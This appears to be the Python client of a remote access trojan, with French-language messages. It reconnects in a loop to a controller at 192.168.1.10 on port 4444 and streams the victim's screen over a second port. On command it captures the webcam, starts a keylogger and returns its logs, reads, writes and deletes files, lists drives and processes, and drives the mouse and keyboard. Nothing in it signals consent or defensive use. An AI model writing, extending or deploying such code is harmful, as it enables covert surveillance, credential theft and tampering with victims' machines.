import sys
import socket
import subprocess
import os
import pyautogui
import platform
import io
import time
import threading
import queue
from protocol import send_data, send_base64, receive_data
from modules import keylogger, screen_capture, file_manager, webcam

if getattr(sys, 'frozen', False):
    os.chdir(sys._MEIPASS)

SERVER_IP = "192.168.1.10"
PORT = 4444
PORT_VIDEO = 4445

frame_queue = queue.Queue(maxsize=10)

def connect_to_server(port):
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, port))
            return s
        except:
            time.sleep(5)

def capture_frames():
    while True:
        try:
            img = screen_capture.take_screenshot()
            if not img:
                continue
            if frame_queue.full():
                frame_queue.get()
            frame_queue.put(img)
            time.sleep(1/20)
        except Exception as e:
            print("[client] Erreur capture:", e)

def stream_screen(s):
    try:
        while True:
            try:
                frame = frame_queue.get(timeout=1)
                if frame:
                    send_base64(s, frame)
            except Exception as e:
                print("[client] Erreur envoi stream:", e)
                break
    finally:
        try:
            s.close()
        except:
            pass

def start_client():
    s_cmd = connect_to_server(PORT)
    s_video = connect_to_server(PORT_VIDEO)

    threading.Thread(target=capture_frames, daemon=True).start()
    threading.Thread(target=stream_screen, args=(s_video,), daemon=True).start()

    while True:
        try:
            command = s_cmd.recv(1024).decode()

            if command == "shell":
                result = subprocess.getoutput("whoami")
                send_data(s_cmd, result)

            elif command == "screencap":
                img = screen_capture.take_screenshot()
                send_base64(s_cmd, img)

            elif command.startswith("listfiles"):
                path = command.split(" ", 1)[1] if " " in command else "."
                result = file_manager.list_directory(path)
                send_data(s_cmd, result)

            elif command == "process":
                cmd = "tasklist" if platform.system() == "Windows" else "ps aux"
                result = subprocess.getoutput(cmd)
                send_data(s_cmd, result)

            elif command.startswith("mouse_move"):
                try:
                    _, x, y, w, h = command.split()
                    screen_w, screen_h = pyautogui.size()
                    x = int(int(x) * screen_w / int(w))
                    y = int(int(y) * screen_h / int(h))
                    pyautogui.moveTo(x, y)
                except:
                    pass

            elif command == "click":
                pyautogui.click()

            elif command.startswith("type"):
                text = command.split(" ", 1)[1]
                specials = {
                    "[enter]": "enter",
                    "\b": "backspace",
                    "\t": "tab",
                    "[esc]": "esc",
                    "[delete]": "delete",
                    "[capslock]": "capslock",
                    "[ctrl]": "ctrl",
                    "[alt]": "alt",
                    "[shift]": "shift",
                    "[left]": "left",
                    "[right]": "right",
                    "[up]": "up",
                    "[down]": "down"
                }
                if text in specials:
                    pyautogui.press(specials[text])
                else:
                    pyautogui.write(text)

            elif command == "webcam":
                img = webcam.capture_webcam()
                send_base64(s_cmd, img if img else b"[Erreur webcam]")

            elif command == "keylogger_start":
                keylogger.start_keylogger()
                send_data(s_cmd, "[Keylogger démarré]")

            elif command == "keylogger_dump":
                logs = keylogger.get_logs()
                send_data(s_cmd, logs if logs else "[Aucune frappe détectée]")

            elif command == "list_drives":
                try:
                    import string
                    from ctypes import windll

                    drives = []
                    bitmask = windll.kernel32.GetLogicalDrives()
                    for i in range(26):
                        if bitmask & (1 << i):
                            drives.append(f"{string.ascii_uppercase[i]}:/")
                    send_data(s_cmd, "\n".join(drives))
                except:
                    send_data(s_cmd, "[Erreur récupération lecteurs]")

            elif command.startswith("writefile"):
                try:
                    path = command.split(" ", 1)[1]
                    content_b64 = receive_data(s_cmd).decode()
                    result = file_manager.write_file(path, content_b64)
                    send_data(s_cmd, result)
                except Exception as e:
                    send_data(s_cmd, f"Erreur écriture : {e}")

            elif command.startswith("readfile"):
                path = command.split(" ", 1)[1] if " " in command else ""
                result = file_manager.read_file(path)
                send_base64(s_cmd, result)

            elif command == "right_click":
                pyautogui.click(button="right")

            elif command.startswith("type_special"):
                key = command.split(" ", 1)[1].strip("[]").lower()
                try:
                    pyautogui.press(key)
                except Exception as e:
                    print(f"[client] Erreur touche spéciale : {key} -> {e}")

            elif command.startswith("deletefile"):
                path = command.split(" ", 1)[1]
                result = file_manager.delete_file(path)
                send_data(s_cmd, result)

            elif command.startswith("metadata"):
                path = command.split(" ", 1)[1]
                result = file_manager.get_metadata(path)
                send_data(s_cmd, result)

            elif command.startswith("scroll"):
                try:
                    delta = int(command.split(" ")[1])
                    pyautogui.scroll(delta)
                except:
                    pass

            elif command == "exit":
                s_cmd.close()
                s_video.close()
                break

            else:
                send_data(s_cmd, "Commande inconnue.")
        except:
            s_cmd = connect_to_server(PORT)

if __name__ == "__main__":
    start_client()
